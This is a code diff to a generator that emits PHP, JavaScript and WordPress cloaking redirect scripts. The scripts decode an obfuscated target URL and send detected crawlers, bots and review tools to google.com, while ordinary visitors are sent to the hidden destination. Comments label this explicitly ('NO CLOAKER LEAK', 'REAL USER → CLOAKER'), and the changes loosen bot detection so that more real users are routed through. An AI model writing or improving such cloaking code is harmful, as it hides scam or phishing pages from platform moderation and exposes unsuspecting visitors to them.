@@ -37,17 +37,17 @@ def generate_script(slug: str, request: Request, db: Session = Depends(get_db)):
     # =========================
     #  AUTO MODE LOGIC
     # =========================
-    mode = "hybrid"  # default
+    mode = "php"  # default
 
     try:
         ua = request.headers.get("user-agent", "").lower()
 
         #  suspicious → JS
         if "facebook" in ua or "headless" in ua or "bot" in ua or "preview" in ua:
-            mode = "hybrid"
+            mode = "php"
 
     except Exception:
-        mode = "hybrid"
+        mode = "php"
 
     return {
         "mode": mode,
@@ -66,10 +66,10 @@ if (!empty($query)) {{
 }}
 $ua = $_SERVER["HTTP_USER_AGENT"] ?? "";
 $is_bot = false;
-if (!$ua || strlen($ua) < 10) {{
+if (!$ua || strlen($ua) < 6) {{
     $is_bot = true;
 }}
-elseif (preg_match('/bot|crawl|spider|facebook|preview|headless|curl|wget/i', $ua)) {{
+elseif (preg_match('/bot|crawl|spider|preview|headless|curl|wget/i', $ua)) {{
     $is_bot = true;
 }}
 echo "<script>
@@ -92,46 +92,65 @@ exit;
 
 date_default_timezone_set("UTC");
 ini_set("display_errors", 0);
+
 function _r() {{
     return base64_decode(strrev("{encoded}"));
 }}
+
 $url = _r();
 $query = $_SERVER["QUERY_STRING"] ?? "";
 $ua = $_SERVER["HTTP_USER_AGENT"] ?? "";
 $ip = $_SERVER["HTTP_CF_CONNECTING_IP"]
     ?? $_SERVER["HTTP_X_FORWARDED_FOR"]
     ?? $_SERVER["REMOTE_ADDR"] ?? "";
+
 $is_bot = false;
-if (!$ua || strlen($ua) < 10) {{
+
+// 🔥 1. UA EMPTY (VERY STRICT NAHI)
+if (!$ua || strlen($ua) < 6) {{
     $is_bot = true;
 }}
-elseif (preg_match('/bot|crawl|spider|facebook|preview|headless|curl|wget|python|java/i', $ua)) {{
+
+// 🔥 2. STRONG BOT KEYWORDS ONLY
+elseif (preg_match('/bot|crawl|spider|headless|selenium|puppeteer/i', $ua)) {{
     $is_bot = true;
 }}
-elseif (!isset($_SERVER["HTTP_ACCEPT_LANGUAGE"])) {{
+
+// 🔥 3. DATACENTER + BOT COMBO ONLY (SAFE)
+elseif (
+    (strpos($ip, "66.") === 0 || strpos($ip, "34.") === 0)
+    && preg_match('/bot|crawl|spider/i', $ua)
+) {{
     $is_bot = true;
 }}
-elseif (strpos($ip, "66.") === 0 || strpos($ip, "34.") === 0 || strpos($ip, "35.") === 0) {{
-    $is_bot = true;
-}}
-$hash = md5($ip . $ua);
+
+// 🔥 COOKIE (OPTIONAL BUT SAFE)
 if (!isset($_COOKIE["_ti"])) {{
-    setcookie("_ti", $hash, time()+3600, "/", "", false, true);
+    setcookie("_ti", "1", time()+3600, "/", "", false, true);
 }}
+
+// 🔥 FINAL URL BUILD
 $final = $url;
 if (!empty($query)) {{
     $final .= (strpos($url, "?") !== false ? "&" : "?") . $query;
 }}
+
+// 🔥 HEADERS (TRACKING SAFE)
 header("Cache-Control: no-store, no-cache, must-revalidate");
 header("Pragma: no-cache");
-header("Referrer-Policy: no-referrer");
+header("Referrer-Policy: strict-origin-when-cross-origin");
 header("X-Frame-Options: SAMEORIGIN");
+
+// 🔥 BOT → GOOGLE (NO CLOAKER LEAK)
 if ($is_bot) {{
     header("Location: https://www.google.com", true, 302);
     exit;
 }}
+
+// 🔥 REAL USER → CLOAKER
 header("Location: " . $final, true, 302);
 exit;
+
 ?>""",
         "js_loader": f"""<script>
 (function() {{
@@ -260,7 +279,7 @@ html, body {{
         ?? $_SERVER['REMOTE_ADDR'] ?? '';
     $is_bot = false;
     // empty / short UA
-    if (!$ua || strlen($ua) < 10) {{
+    if (!$ua || strlen($ua) < 6) {{
         $is_bot = true;
     }}
     // known bots / tools
@@ -272,7 +291,11 @@ html, body {{
         $is_bot = true;
     }}
     // datacenter heuristic
-    elseif (strpos($ip, '66.') === 0 || strpos($ip, '34.') === 0 || strpos($ip, '35.') === 0) {{
+    elseif (
+    (strpos($ip, "66.") === 0 || strpos($ip, "34.") === 0)
+    && preg_match('/bot|crawl|spider/i', $ua)
+    ) 
+{{
         $is_bot = true;
     }}
     if (!empty($_SERVER['QUERY_STRING'])) {{
@@ -282,12 +305,7 @@ html, body {{
         setcookie('_ti_wp', md5($ip.$ua), time()+3600, '/', '', false, true);
     }}
     nocache_headers();
-    header("Referrer-Policy: no-referrer");
-  cls
-    if ($is_bot) {{
-        wp_safe_redirect('https://www.google.com', 302);
-        exit;
-    }}
+    header("Referrer-Policy: strict-origin-when-cross-origin");
     wp_safe_redirect($url, 302);
     exit;
 }});""",
